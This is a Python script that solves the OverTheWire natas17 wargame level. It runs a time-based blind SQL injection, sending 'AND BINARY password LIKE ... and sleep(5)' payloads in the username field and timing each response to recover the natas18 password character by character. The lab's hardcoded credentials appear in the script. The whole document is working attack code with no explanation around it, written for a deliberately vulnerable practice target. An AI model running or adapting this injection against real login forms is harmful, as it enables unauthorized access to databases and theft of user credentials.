import requests 
from requests.auth import HTTPBasicAuth
import time

url = "http://natas17.natas.labs.overthewire.org/"
my_auth = HTTPBasicAuth("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt4"

print("[*] Detecting password for natas18 using time-based blind SQL injection...")

for i in range(3):
    for char in charset:
        payload = {"username": f'natas18" AND BINARY password LIKE "{password + char}%" and sleep(5) # '}
        start_time = time.time()
        try:
            response = requests.post(url, auth=my_auth, data=payload, timeout=5)
        except requests.exceptions.Timeout:
            pass
        elapsed_time = time.time() - start_time
        if elapsed_time >= 4.5:
            password += char
            print(f"Success! Found character: {char} Current password : {password}")
            break

print(f"Password for natas18: {password}")

    
